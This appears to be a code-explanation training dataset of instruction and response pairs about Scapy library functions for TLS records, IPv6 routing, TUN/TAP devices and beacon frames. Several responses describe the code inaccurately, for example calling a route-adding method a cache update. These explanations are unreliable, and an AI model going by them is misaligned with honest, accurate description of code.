{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconverting a Python 2 function as lambda (x,y): x + y In the Python 3 format: lambda x,y : x + y", "response": "def lambda_tuple_converter(func):\n    \"\"\"\n    Converts a Python 2 function as\n      lambda (x,y): x + y\n    In the Python 3 format:\n      lambda x,y : x + y\n    \"\"\"\n    if func is not None and func.__code__.co_argcount == 1:\n        return lambda *args: func(args[0] if len(args) == 1 else args)\n    else:\n        return func"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef base64_bytes(x):\n    if six.PY2:\n        return base64.decodestring(x)\n    return base64.decodebytes(bytes_encode(x))", "response": "Turn base64 into bytes"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef bytes_base64(x):\n    if six.PY2:\n        return base64.encodestring(x).replace('\\n', '')\n    return base64.encodebytes(bytes_encode(x)).replace(b'\\n', b'')", "response": "Turn bytes into base64"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef m2i(self, pkt, m):\n        cls = Raw\n        if pkt.type == 22:\n            if len(m) >= 1:\n                msgtype = orb(m[0])\n                cls = _tls_handshake_cls.get(msgtype, Raw)\n        elif pkt.type == 20:\n            cls = TLSChangeCipherSpec\n        elif pkt.type == 21:\n            cls = TLSAlert\n        elif pkt.type == 23:\n            cls = TLSApplicationData\n\n        if cls is Raw:\n            return Raw(m)\n        else:\n            try:\n                return cls(m, tls_session=pkt.tls_session)\n            except Exception:\n                if conf.debug_dissector:\n                    raise\n                return Raw(m)", "response": "Parses a message into an internal object."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef getfield(self, pkt, s):\n        tmp_len = self.length_from(pkt)\n        lst = []\n        ret = b\"\"\n        remain = s\n        if tmp_len is not None:\n            remain, ret = s[:tmp_len], s[tmp_len:]\n\n        if remain == b\"\":\n            if (((pkt.tls_session.tls_version or 0x0303) > 0x0200) and\n                    hasattr(pkt, \"type\") and pkt.type == 23):\n                return ret, [TLSApplicationData(data=b\"\")]\n            else:\n                return ret, [Raw(load=b\"\")]\n\n        if False in six.itervalues(pkt.tls_session.rcs.cipher.ready):\n            return ret, _TLSEncryptedContent(remain)\n        else:\n            while remain:\n                raw_msg = remain\n                p = self.m2i(pkt, remain)\n                if Padding in p:\n                    pad = p[Padding]\n                    remain = pad.load\n                    del(pad.underlayer.payload)\n                    if len(remain) != 0:\n                        raw_msg = raw_msg[:-len(remain)]\n                else:\n                    remain = b\"\"\n\n                if isinstance(p, _GenericTLSSessionInheritance):\n                    if not p.tls_session.frozen:\n                        p.post_dissection_tls_session_update(raw_msg)\n\n                lst.append(p)\n            return remain + ret, lst", "response": "This method is used to get the message header fields from the message header."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the context with information from the built packet.", "response": "def i2m(self, pkt, p):\n        \"\"\"\n        Update the context with information from the built packet.\n        If no type was given at the record layer, we try to infer it.\n        \"\"\"\n        cur = b\"\"\n        if isinstance(p, _GenericTLSSessionInheritance):\n            if pkt.type is None:\n                if isinstance(p, TLSChangeCipherSpec):\n                    pkt.type = 20\n                elif isinstance(p, TLSAlert):\n                    pkt.type = 21\n                elif isinstance(p, _TLSHandshake):\n                    pkt.type = 22\n                elif isinstance(p, TLSApplicationData):\n                    pkt.type = 23\n            p.tls_session = pkt.tls_session\n            if not pkt.tls_session.frozen:\n                cur = p.raw_stateful()\n                p.post_build_tls_session_update(cur)\n            else:\n                cur = raw(p)\n        else:\n            pkt.type = 23\n            cur = raw(p)\n        return cur"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef addfield(self, pkt, s, val):\n        res = b\"\"\n        for p in val:\n            res += self.i2m(pkt, p)\n        if (isinstance(pkt, _GenericTLSSessionInheritance) and\n            _tls_version_check(pkt.tls_session.tls_version, 0x0304) and\n                not isinstance(pkt, TLS13ServerHello)):\n            return s + res\n        if not pkt.type:\n            pkt.type = 0\n        hdr = struct.pack(\"!B\", pkt.type) + s[1:5]\n        return hdr + res", "response": "Add the fields to the header."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nverifies the HMAC of the record header and the message.", "response": "def _tls_hmac_verify(self, hdr, msg, mac):\n        \"\"\"\n        Provided with the record header, the TLSCompressed.fragment and the\n        HMAC, return True if the HMAC is correct. If we could not compute the\n        HMAC because the key was missing, there is no sense in verifying\n        anything, thus we also return True.\n\n        Meant to be used with a block cipher or a stream cipher.\n        It would fail with an AEAD cipher, because rcs.hmac would be None.\n        See RFC 5246, section 6.2.3.\n        \"\"\"\n        read_seq_num = struct.pack(\"!Q\", self.tls_session.rcs.seq_num)\n        self.tls_session.rcs.seq_num += 1\n\n        mac_len = self.tls_session.rcs.mac_len\n        if mac_len == 0:            # should be TLS_NULL_WITH_NULL_NULL\n            return True\n        if len(mac) != mac_len:\n            return False\n\n        alg = self.tls_session.rcs.hmac\n        version = struct.unpack(\"!H\", hdr[1:3])[0]\n        try:\n            if version > 0x300:\n                h = alg.digest(read_seq_num + hdr + msg)\n            elif version == 0x300:\n                h = alg.digest_sslv3(read_seq_num + hdr[:1] + hdr[3:5] + msg)\n            else:\n                raise Exception(\"Unrecognized version.\")\n        except HMACError:\n            h = mac\n        return h == mac"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndecompresses the given string.", "response": "def _tls_decompress(self, s):\n        \"\"\"\n        Provided with the TLSCompressed.fragment,\n        return the TLSPlaintext.fragment.\n        \"\"\"\n        alg = self.tls_session.rcs.compression\n        return alg.decompress(s)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef pre_dissect(self, s):\n        if len(s) < 5:\n            raise Exception(\"Invalid record: header is too short.\")\n\n        msglen = struct.unpack('!H', s[3:5])[0]\n        hdr, efrag, r = s[:5], s[5:5 + msglen], s[msglen + 5:]\n\n        iv = mac = pad = b\"\"\n        self.padlen = None\n        decryption_success = False\n\n        cipher_type = self.tls_session.rcs.cipher.type\n\n        if cipher_type == 'block':\n            version = struct.unpack(\"!H\", s[1:3])[0]\n\n            # Decrypt\n            try:\n                if version >= 0x0302:\n                    # Explicit IV for TLS 1.1 and 1.2\n                    block_size = self.tls_session.rcs.cipher.block_size\n                    iv, efrag = efrag[:block_size], efrag[block_size:]\n                    self.tls_session.rcs.cipher.iv = iv\n                    pfrag = self._tls_decrypt(efrag)\n                else:\n                    # Implicit IV for SSLv3 and TLS 1.0\n                    pfrag = self._tls_decrypt(efrag)\n            except CipherError as e:\n                # This will end up dissected as _TLSEncryptedContent.\n                cfrag = e.args[0]\n            else:\n                decryption_success = True\n                # Excerpt below better corresponds to TLS 1.1 IV definition,\n                # but the result is the same as with TLS 1.2 anyway.\n                # This leading *IV* has been decrypted by _tls_decrypt with a\n                # random IV, hence it does not correspond to anything.\n                # What actually matters is that we got the first encrypted block  # noqa: E501\n                # in order to decrypt the second block (first data block).\n                # if version >= 0x0302:\n                #    block_size = self.tls_session.rcs.cipher.block_size\n                #    iv, pfrag = pfrag[:block_size], pfrag[block_size:]\n                #    l = struct.unpack('!H', hdr[3:5])[0]\n                #    hdr = hdr[:3] + struct.pack('!H', l-block_size)\n\n                # Extract padding ('pad' actually includes the trailing padlen)\n                padlen = orb(pfrag[-1]) + 1\n                mfrag, pad = pfrag[:-padlen], pfrag[-padlen:]\n                self.padlen = padlen\n\n                # Extract MAC\n                tmp_len = self.tls_session.rcs.mac_len\n                if tmp_len != 0:\n                    cfrag, mac = mfrag[:-tmp_len], mfrag[-tmp_len:]\n                else:\n                    cfrag, mac = mfrag, b\"\"\n\n                # Verify integrity\n                chdr = hdr[:3] + struct.pack('!H', len(cfrag))\n                is_mac_ok = self._tls_hmac_verify(chdr, cfrag, mac)\n                if not is_mac_ok:\n                    pkt_info = self.firstlayer().summary()\n                    log_runtime.info(\"TLS: record integrity check failed [%s]\", pkt_info)  # noqa: E501\n\n        elif cipher_type == 'stream':\n            # Decrypt\n            try:\n                pfrag = self._tls_decrypt(efrag)\n            except CipherError as e:\n                # This will end up dissected as _TLSEncryptedContent.\n                cfrag = e.args[0]\n            else:\n                decryption_success = True\n                mfrag = pfrag\n\n                # Extract MAC\n                tmp_len = self.tls_session.rcs.mac_len\n                if tmp_len != 0:\n                    cfrag, mac = mfrag[:-tmp_len], mfrag[-tmp_len:]\n                else:\n                    cfrag, mac = mfrag, b\"\"\n\n                # Verify integrity\n                chdr = hdr[:3] + struct.pack('!H', len(cfrag))\n                is_mac_ok = self._tls_hmac_verify(chdr, cfrag, mac)\n                if not is_mac_ok:\n                    pkt_info = self.firstlayer().summary()\n                    log_runtime.info(\"TLS: record integrity check failed [%s]\", pkt_info)  # noqa: E501\n\n        elif cipher_type == 'aead':\n            # Authenticated encryption\n            # crypto/cipher_aead.py prints a warning for integrity failure\n            if (conf.crypto_valid_advanced and\n                    isinstance(self.tls_session.rcs.cipher, Cipher_CHACHA20_POLY1305)):  # noqa: E501\n                iv = b\"\"\n                cfrag, mac = self._tls_auth_decrypt(hdr, efrag)\n            else:\n                iv, cfrag, mac = self._tls_auth_decrypt(hdr, efrag)\n            decryption_success = True       # see XXX above\n\n        frag = self._tls_decompress(cfrag)\n\n        if (decryption_success and\n                not isinstance(self.tls_session.rcs.cipher, Cipher_NULL)):\n            self.deciphered_len = len(frag)\n        else:\n            self.deciphered_len = None\n\n        reconstructed_body = iv + frag + mac + pad\n\n        return hdr + reconstructed_body + r", "response": "Decrypt verify and decompress the message s and return the _TLSEncryptedContent."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncommits the pending r/w state if it has been triggered.", "response": "def post_dissect(self, s):\n        \"\"\"\n        Commit the pending r/w state if it has been triggered (e.g. by an\n        underlying TLSChangeCipherSpec or a SSLv2ClientMasterKey). We update\n        nothing if the prcs was not set, as this probably means that we're\n        working out-of-context (and we need to keep the default rcs).\n        \"\"\"\n        if self.tls_session.triggered_prcs_commit:\n            if self.tls_session.prcs is not None:\n                self.tls_session.rcs = self.tls_session.prcs\n                self.tls_session.prcs = None\n            self.tls_session.triggered_prcs_commit = False\n        if self.tls_session.triggered_pwcs_commit:\n            if self.tls_session.pwcs is not None:\n                self.tls_session.wcs = self.tls_session.pwcs\n                self.tls_session.pwcs = None\n            self.tls_session.triggered_pwcs_commit = False\n        return s"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncompress the given string.", "response": "def _tls_compress(self, s):\n        \"\"\"\n        Provided with the TLSPlaintext.fragment,\n        return the TLSCompressed.fragment.\n        \"\"\"\n        alg = self.tls_session.wcs.compression\n        return alg.compress(s)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _tls_auth_encrypt(self, s):\n        write_seq_num = struct.pack(\"!Q\", self.tls_session.wcs.seq_num)\n        self.tls_session.wcs.seq_num += 1\n        add_data = (write_seq_num +\n                    pkcs_i2osp(self.type, 1) +\n                    pkcs_i2osp(self.version, 2) +\n                    pkcs_i2osp(len(s), 2))\n        return self.tls_session.wcs.cipher.auth_encrypt(s, add_data,\n                                                        write_seq_num)", "response": "This method is used to encrypt the data with the AEAD cipher."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd the message to the HMAC.", "response": "def _tls_hmac_add(self, hdr, msg):\n        \"\"\"\n        Provided with the record header (concatenation of the TLSCompressed\n        type, version and length fields) and the TLSCompressed.fragment,\n        return the concatenation of the TLSCompressed.fragment and the HMAC.\n\n        Meant to be used with a block cipher or a stream cipher.\n        It would fail with an AEAD cipher, because wcs.hmac would be None.\n        See RFC 5246, section 6.2.3.\n        \"\"\"\n        write_seq_num = struct.pack(\"!Q\", self.tls_session.wcs.seq_num)\n        self.tls_session.wcs.seq_num += 1\n\n        alg = self.tls_session.wcs.hmac\n        version = struct.unpack(\"!H\", hdr[1:3])[0]\n        if version > 0x300:\n            h = alg.digest(write_seq_num + hdr + msg)\n        elif version == 0x300:\n            h = alg.digest_sslv3(write_seq_num + hdr[:1] + hdr[3:5] + msg)\n        else:\n            raise Exception(\"Unrecognized version.\")\n        return msg + h"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _tls_pad(self, s):\n        padding = b\"\"\n        block_size = self.tls_session.wcs.cipher.block_size\n        padlen = block_size - ((len(s) + 1) % block_size)\n        if padlen == block_size:\n            padlen = 0\n        pad_pattern = chb(padlen)\n        padding = pad_pattern * (padlen + 1)\n        return s + padding", "response": "Pads the given string with the right padding."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef post_build(self, pkt, pay):\n        # Compute the length of TLSPlaintext fragment\n        hdr, frag = pkt[:5], pkt[5:]\n        tmp_len = len(frag)\n        hdr = hdr[:3] + struct.pack(\"!H\", tmp_len)\n\n        # Compression\n        cfrag = self._tls_compress(frag)\n        tmp_len = len(cfrag)  # Update the length as a result of compression\n        hdr = hdr[:3] + struct.pack(\"!H\", tmp_len)\n\n        cipher_type = self.tls_session.wcs.cipher.type\n\n        if cipher_type == 'block':\n            # Integrity\n            mfrag = self._tls_hmac_add(hdr, cfrag)\n\n            # Excerpt below better corresponds to TLS 1.1 IV definition,\n            # but the result is the same as with TLS 1.2 anyway.\n            # if self.version >= 0x0302:\n            #    l = self.tls_session.wcs.cipher.block_size\n            #    iv = randstring(l)\n            #    mfrag = iv + mfrag\n\n            # Add padding\n            pfrag = self._tls_pad(mfrag)\n\n            # Encryption\n            if self.version >= 0x0302:\n                # Explicit IV for TLS 1.1 and 1.2\n                tmp_len = self.tls_session.wcs.cipher.block_size\n                iv = randstring(tmp_len)\n                self.tls_session.wcs.cipher.iv = iv\n                efrag = self._tls_encrypt(pfrag)\n                efrag = iv + efrag\n            else:\n                # Implicit IV for SSLv3 and TLS 1.0\n                efrag = self._tls_encrypt(pfrag)\n\n        elif cipher_type == \"stream\":\n            # Integrity\n            mfrag = self._tls_hmac_add(hdr, cfrag)\n            # Encryption\n            efrag = self._tls_encrypt(mfrag)\n\n        elif cipher_type == \"aead\":\n            # Authenticated encryption (with nonce_explicit as header)\n            efrag = self._tls_auth_encrypt(cfrag)\n\n        if self.len is not None:\n            # The user gave us a 'len', let's respect this ultimately\n            hdr = hdr[:3] + struct.pack(\"!H\", self.len)\n        else:\n            # Update header with the length of TLSCiphertext.fragment\n            hdr = hdr[:3] + struct.pack(\"!H\", len(efrag))\n\n        # Now we commit the pending write state if it has been triggered (e.g.\n        # by an underlying TLSChangeCipherSpec or a SSLv2ClientMasterKey). We\n        # update nothing if the pwcs was not set. This probably means that\n        # we're working out-of-context (and we need to keep the default wcs).\n        if self.tls_session.triggered_pwcs_commit:\n            if self.tls_session.pwcs is not None:\n                self.tls_session.wcs = self.tls_session.pwcs\n                self.tls_session.pwcs = None\n            self.tls_session.triggered_pwcs_commit = False\n\n        return hdr + efrag + pay", "response": "Apply the previous methods according to the writing cipher type."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef open(self):\n        if not self.closed:\n            return\n        self.outs = self.ins = open(\n            \"/dev/net/tun\" if LINUX else (\"/dev/%s\" % self.iface), \"r+b\",\n            buffering=0\n        )\n        if LINUX:\n            from fcntl import ioctl\n            # TUNSETIFF = 0x400454ca\n            # IFF_TUN = 0x0001\n            # IFF_TAP = 0x0002\n            # IFF_NO_PI = 0x1000\n            ioctl(self.ins, 0x400454ca, struct.pack(\n                \"16sH\", bytes_encode(self.iface),\n                0x0001 if self.mode_tun else 0x1002,\n            ))\n        self.closed = False", "response": "Open the TUN or TAP device."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef util_mic_len(pkt):\n    ''' Calculate the length of the attribute value field '''\n    if (pkt.nwk_seclevel == 0):  # no encryption, no mic\n        return 0\n    elif (pkt.nwk_seclevel == 1):  # MIC-32\n        return 4\n    elif (pkt.nwk_seclevel == 2):  # MIC-64\n        return 8\n    elif (pkt.nwk_seclevel == 3):  # MIC-128\n        return 16\n    elif (pkt.nwk_seclevel == 4):  # ENC\n        return 0\n    elif (pkt.nwk_seclevel == 5):  # ENC-MIC-32\n        return 4\n    elif (pkt.nwk_seclevel == 6):  # ENC-MIC-64\n        return 8\n    elif (pkt.nwk_seclevel == 7):  # ENC-MIC-128\n        return 16\n    else:\n        return 0", "response": "Calculate the length of the attribute value field in the MIC - 32 or MIC - 64 representation."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild a list of EIR messages to wrap this frame.", "response": "def build_eir(self):\n        \"\"\"Builds a list of EIR messages to wrap this frame.\"\"\"\n\n        return LowEnergyBeaconHelper.base_eir + [\n            EIR_Hdr() / EIR_CompleteList16BitServiceUUIDs(svc_uuids=[\n                EDDYSTONE_UUID]),\n            EIR_Hdr() / EIR_ServiceData16BitUUID() / self\n        ]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating an Eddystone_Frame with a Eddystone_URL for a given URL.", "response": "def from_url(url):\n        \"\"\"Creates an Eddystone_Frame with a Eddystone_URL for a given URL.\"\"\"\n        url = url.encode('ascii')\n        scheme = None\n        for k, v in EDDYSTONE_URL_SCHEMES.items():\n            if url.startswith(v):\n                scheme = k\n                url = url[len(v):]\n                break\n        else:\n            raise Exception(\"URLs must start with EDDYSTONE_URL_SCHEMES\")\n\n        return Eddystone_Frame() / Eddystone_URL(\n            url_scheme=scheme,\n            url=url)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add(self, *args, **kargs):\n        self.invalidate_cache()\n        self.routes.append(self.make_route(*args, **kargs))", "response": "Add a new entry to the cache."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nremove all route entries that uses iff interface.", "response": "def ifdel(self, iff):\n        \"\"\" removes all route entries that uses 'iff' interface. \"\"\"\n        new_routes = []\n        for rt in self.routes:\n            if rt[3] != iff:\n                new_routes.append(rt)\n        self.invalidate_cache()\n        self.routes = new_routes"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef ifadd(self, iff, addr):\n        addr, plen = (addr.split(\"/\") + [\"128\"])[:2]\n        addr = in6_ptop(addr)\n        plen = int(plen)\n        naddr = inet_pton(socket.AF_INET6, addr)\n        nmask = in6_cidr2mask(plen)\n        prefix = inet_ntop(socket.AF_INET6, in6_and(nmask, naddr))\n        self.invalidate_cache()\n        self.routes.append((prefix, plen, '::', iff, [addr], 1))", "response": "Add an interface iff with provided address into routing table."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a dict of cache entries for a given destination address.", "response": "def route(self, dst=None, dev=None, verbose=conf.verb):\n        \"\"\"\n        Provide best route to IPv6 destination address, based on Scapy\n        internal routing table content.\n\n        When a set of address is passed (e.g. 2001:db8:cafe:*::1-5) an address\n        of the set is used. Be aware of that behavior when using wildcards in\n        upper parts of addresses !\n\n        If 'dst' parameter is a FQDN, name resolution is performed and result\n        is used.\n\n        if optional 'dev' parameter is provided a specific interface, filtering\n        is performed to limit search to route associated to that interface.\n        \"\"\"\n        dst = dst or \"::/0\"  # Enable route(None) to return default route\n        # Transform \"2001:db8:cafe:*::1-5:0/120\" to one IPv6 address of the set\n        dst = dst.split(\"/\")[0]\n        savedst = dst  # In case following inet_pton() fails\n        dst = dst.replace(\"*\", \"0\")\n        idx = dst.find(\"-\")\n        while idx >= 0:\n            m = (dst[idx:] + \":\").find(\":\")\n            dst = dst[:idx] + dst[idx + m:]\n            idx = dst.find(\"-\")\n\n        try:\n            inet_pton(socket.AF_INET6, dst)\n        except socket.error:\n            dst = socket.getaddrinfo(savedst, None, socket.AF_INET6)[0][-1][0]\n            # TODO : Check if name resolution went well\n\n        # Use the default interface while dealing with link-local addresses\n        if dev is None and (in6_islladdr(dst) or in6_ismlladdr(dst)):\n            dev = conf.iface\n\n        # Deal with dev-specific request for cache search\n        k = dst\n        if dev is not None:\n            k = dst + \"%%\" + (dev if isinstance(dev, six.string_types) else dev.pcap_name)  # noqa: E501\n        if k in self.cache:\n            return self.cache[k]\n\n        paths = []\n\n        # TODO : review all kinds of addresses (scope and *cast) to see\n        #        if we are able to cope with everything possible. I'm convinced\n        #        it's not the case.\n        # -- arnaud\n        for p, plen, gw, iface, cset, me in self.routes:\n            if dev is not None and iface != dev:\n                continue\n            if in6_isincluded(dst, p, plen):\n                paths.append((plen, me, (iface, cset, gw)))\n            elif (in6_ismlladdr(dst) and in6_islladdr(p) and in6_islladdr(cset[0])):  # noqa: E501\n                paths.append((plen, me, (iface, cset, gw)))\n\n        if not paths:\n            if verbose:\n                warning(\"No route found for IPv6 destination %s \"\n                        \"(no default route?)\", dst)\n            return (scapy.consts.LOOPBACK_INTERFACE, \"::\", \"::\")\n\n        # Sort with longest prefix first then use metrics as a tie-breaker\n        paths.sort(key=lambda x: (-x[0], x[1]))\n\n        best_plen = (paths[0][0], paths[0][1])\n        paths = [x for x in paths if (x[0], x[1]) == best_plen]\n\n        res = []\n        for p in paths:  # Here we select best source address for every route\n            tmp = p[2]\n            srcaddr = get_source_addr_from_candidate_set(dst, tmp[1])\n            if srcaddr is not None:\n                res.append((p[0], p[1], (tmp[0], srcaddr, tmp[2])))\n\n        if res == []:\n            warning(\"Found a route for IPv6 destination '%s', but no possible source address.\", dst)  # noqa: E501\n            return (scapy.consts.LOOPBACK_INTERFACE, \"::\", \"::\")\n\n        # Symptom  : 2 routes with same weight (our weight is plen)\n        # Solution :\n        #  - dst is unicast global. Check if it is 6to4 and we have a source\n        #    6to4 address in those available\n        #  - dst is link local (unicast or multicast) and multiple output\n        #    interfaces are available. Take main one (conf.iface6)\n        #  - if none of the previous or ambiguity persists, be lazy and keep\n        #    first one\n\n        if len(res) > 1:\n            tmp = []\n            if in6_isgladdr(dst) and in6_isaddr6to4(dst):\n                # TODO : see if taking the longest match between dst and\n                #        every source addresses would provide better results\n                tmp = [x for x in res if in6_isaddr6to4(x[2][1])]\n            elif in6_ismaddr(dst) or in6_islladdr(dst):\n                # TODO : I'm sure we are not covering all addresses. Check that\n                tmp = [x for x in res if x[2][0] == conf.iface6]\n\n            if tmp:\n                res = tmp\n\n        # Fill the cache (including dev-specific request)\n        k = dst\n        if dev is not None:\n            k = dst + \"%%\" + (dev if isinstance(dev, six.string_types) else dev.pcap_name)  # noqa: E501\n        self.cache[k] = res[0][2]\n\n        return res[0][2]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncompresses a TLSPlaintext instance using a compression algorithm instance alg and return a TLSCompressed instance.", "response": "def _tls_compress(alg, p):\n    \"\"\"\n    Compress p (a TLSPlaintext instance) using compression algorithm instance\n    alg and return a TLSCompressed instance.\n    \"\"\"\n    c = TLSCompressed()\n    c.type = p.type\n    c.version = p.version\n    c.data = alg.compress(p.data)\n    c.len = len(c.data)\n    return c"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndecompressing a TLSCompressed instance using the compression algorithm and return a TLSPlaintext instance.", "response": "def _tls_decompress(alg, c):\n    \"\"\"\n    Decompress c (a TLSCompressed instance) using compression algorithm\n    instance alg and return a TLSPlaintext instance.\n    \"\"\"\n    p = TLSPlaintext()\n    p.type = c.type\n    p.version = c.version\n    p.data = alg.decompress(c.data)\n    p.len = len(p.data)\n    return p"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _tls_mac_add(alg, c, write_seq_num):\n    write_seq_num = struct.pack(\"!Q\", write_seq_num)\n    h = alg.digest(write_seq_num + bytes(c))\n    c.data += h\n    c.len += alg.hash_len", "response": "Compute the MAC using the provided MAC alg instance over TLSCiphertext c using\n    current write sequence number write_seq_num."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _tls_mac_verify(alg, p, read_seq_num):\n    h_size = alg.hash_len\n    if p.len < h_size:\n        return False\n    received_h = p.data[-h_size:]\n    p.len -= h_size\n    p.data = p.data[:-h_size]\n\n    read_seq_num = struct.pack(\"!Q\", read_seq_num)\n    h = alg.digest(read_seq_num + bytes(p))\n    return h == received_h", "response": "Verify that the MAC in the provided message is valid."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nprovides with cipher block size parameter and current TLSCompressed packet p (after MAC addition), the function adds required, deterministic padding to p.data before encryption step, as it is defined for TLS (i.e. not SSL and its allowed random padding). The function has no return value.", "response": "def _tls_add_pad(p, block_size):\n    \"\"\"\n    Provided with cipher block size parameter and current TLSCompressed packet\n    p (after MAC addition), the function adds required, deterministic padding\n    to p.data before encryption step, as it is defined for TLS (i.e. not\n    SSL and its allowed random padding). The function has no return value.\n    \"\"\"\n    padlen = -p.len % block_size\n    padding = chb(padlen) * (padlen + 1)\n    p.len += len(padding)\n    p.data += padding"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _tls_del_pad(p):\n\n    if p.len < 1:\n        warning(\"Message format is invalid (padding)\")\n        return False\n\n    padlen = orb(p.data[-1])\n    padsize = padlen + 1\n\n    if p.len < padsize:\n        warning(\"Invalid padding length\")\n        return False\n\n    if p.data[-padsize:] != chb(padlen) * padsize:\n        warning(\"Padding content is invalid %s\", repr(p.data[-padsize:]))\n        return False\n\n    p.data = p.data[:-padsize]\n    p.len -= padsize\n\n    return True", "response": "This function is used to remove the trailing padding found in p. data."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _tls_encrypt(alg, p):\n    c = TLSCiphertext()\n    c.type = p.type\n    c.version = p.version\n    c.data = alg.encrypt(p.data)\n    c.len = len(c.data)\n    return c", "response": "This function encrypts a TLSCompressed packet and returns a TLSCiphertext object."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nprovide with a TLSCiphertext instance c, and a stream or block cipher alg, the function decrypts c.data and returns a newly created TLSPlaintext.", "response": "def _tls_decrypt(alg, c):\n    \"\"\"\n    Provided with a TLSCiphertext instance c, and a stream or block cipher alg,\n    the function decrypts c.data and returns a newly created TLSPlaintext.\n    \"\"\"\n    p = TLSPlaintext()\n    p.type = c.type\n    p.version = c.version\n    p.data = alg.decrypt(c.data)\n    p.len = len(p.data)\n    return p"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _tls_aead_auth_encrypt(alg, p, write_seq_num):\n    P = bytes(p)\n    write_seq_num = struct.pack(\"!Q\", write_seq_num)\n    A = write_seq_num + P[:5]\n\n    c = TLSCiphertext()\n    c.type = p.type\n    c.version = p.version\n    c.data = alg.auth_encrypt(P, A, write_seq_num)\n    c.len = len(c.data)\n    return c", "response": "This function applies an AEAD cipher to p. data and returns a TLSCiphertext instance with the encrypted data."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _extcap_call(prog, args, keyword, values):\n    p = subprocess.Popen(\n        [prog] + args,\n        stdout=subprocess.PIPE, stderr=subprocess.PIPE\n    )\n    data, err = p.communicate()\n    if p.returncode != 0:\n        raise OSError(\"%s returned with error code %s: %s\" % (prog,\n                                                              p.returncode,\n                                                              err))\n    data = plain_str(data)\n    res = []\n    for ifa in data.split(\"\\n\"):\n        ifa = ifa.strip()\n        if not ifa.startswith(keyword):\n            continue\n        res.append(tuple([re.search(r\"{%s=([^}]*)}\" % val, ifa).group(1)\n                   for val in values]))\n    return res", "response": "Function used to call a program using the extcap format and parse the results"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nbuilds a list of _HCSINullField with numbered \"Reserved\" names.", "response": "def _hcsi_null_range(*args, **kwargs):\n    \"\"\"Builds a list of _HCSINullField with numbered \"Reserved\" names.\n\n    Takes the same arguments as the ``range`` built-in.\n\n    :returns: list[HCSINullField]\n    \"\"\"\n    return [\n        HCSINullField('Reserved{:02d}'.format(x))\n        for x in range(*args, **kwargs)\n    ]"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert internal value to machine value", "response": "def i2m(self, pkt, x):\n        \"\"\"Convert internal value to machine value\"\"\"\n        if x is None:\n            # Try to return zero if undefined\n            x = self.h2i(pkt, 0)\n        return x"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the main unicast address associated with provided interface in human readable form.", "response": "def get_if_addr6(iff):\n    \"\"\"\n    Returns the main global unicast address associated with provided\n    interface, in human readable form. If no global address is found,\n    None is returned.\n    \"\"\"\n    return next((x[0] for x in in6_getifaddr()\n                 if x[2] == iff and x[1] == IPV6_ADDR_GLOBAL), None)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the main unicast address associated with provided interface in network format.", "response": "def get_if_raw_addr6(iff):\n    \"\"\"\n    Returns the main global unicast address associated with provided\n    interface, in network format. If no global address is found, None\n    is returned.\n    \"\"\"\n    ip6 = get_if_addr6(iff)\n    if ip6 is not None:\n        return inet_pton(socket.AF_INET6, ip6)\n\n    return None"}
